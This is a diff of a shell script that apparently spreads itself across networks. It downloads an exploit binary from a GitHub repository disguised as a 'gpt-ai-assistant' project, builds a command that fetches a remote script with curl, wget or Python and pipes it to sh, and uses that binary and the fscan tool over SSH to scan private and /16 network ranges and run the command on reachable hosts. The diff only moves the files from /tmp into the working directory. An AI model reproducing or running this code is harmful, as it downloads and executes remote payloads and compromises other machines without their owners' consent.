@@ -1,6 +1,6 @@
 #!/bin/sh
 
-flagfile="/tmp/.sjyir.temp"
+flagfile="/tmp/.sjyair1.temp"
 if [ -f "$flagfile" ]; then
     exit 0
 fi
@@ -70,30 +70,30 @@ nohup "$LOCAL_NAME" >/dev/null 2>&1 </dev/null &
 
 
 DOWNLOAD_URL="http://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/tool/fs_exp"
-LOCAL_NAME="/tmp/.si"
+LOCAL_NAME=".si"
 CMD="(curl -fsSL -m180 https://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/tool/a || wget -T180 -qO- https://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/tool/a || python2 -c \"import urllib2,sys;sys.stdout.write(urllib2.urlopen(\\\"https://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/tool/a\\\",timeout=180).read())\" || python3 -c \"import urllib.request,sys;sys.stdout.buffer.write(urllib.request.urlopen(\\\"https://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/tool/a\\\",timeout=180).read())\") | sh"
 
-rm -rf "$LOCAL_NAME"
+rm -rf "./$LOCAL_NAME"
 if download_file "$DOWNLOAD_URL" "$LOCAL_NAME"; then
-    chmod +x "$LOCAL_NAME"
+    chmod +x "./$LOCAL_NAME"
 fi
 for b in $(get_b_segments); do
-    "$LOCAL_NAME" -cidr "$b.0.0/16" -c "$CMD"
-    "$LOCAL_NAME" -cidr "$b.0.0/16" -c "$CMD" -p 5080
+    "./$LOCAL_NAME" -cidr "$b.0.0/16" -c "$CMD"
+    "./$LOCAL_NAME" -cidr "$b.0.0/16" -c "$CMD" -p 5080
 done
-rm -rf "$LOCAL_NAME"
+rm -rf "./$LOCAL_NAME"
 
 
 furl="https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan"
-LOCAL_NAME="/tmp/.stdin"
-rm -rf "$LOCAL_NAME"
+LOCAL_NAME=".stdin"
+rm -rf "./$LOCAL_NAME"
 if download_file "$furl" "$LOCAL_NAME"; then
-    chmod +x "$LOCAL_NAME"
+    chmod +x "./$LOCAL_NAME"
 fi
 for b in $(get_b_segments); do
-    "$LOCAL_NAME" -h "$b.0.0/16" -c "$CMD" -m ssh -np -no
+    "./$LOCAL_NAME" -h "$b.0.0/16" -c "$CMD" -m ssh -np -no
 done
-"$LOCAL_NAME" -h 192.168.0.1/16 -c "$CMD" -m ssh -np -no
-"$LOCAL_NAME" -h 172.16.0.1/12 -c "$CMD" -m ssh -no
-rm -rf "$LOCAL_NAME"
+"./$LOCAL_NAME" -h 192.168.0.1/16 -c "$CMD" -m ssh -np -no
+"./$LOCAL_NAME" -h 172.16.0.1/12 -c "$CMD" -m ssh -no
+rm -rf "./$LOCAL_NAME"
 
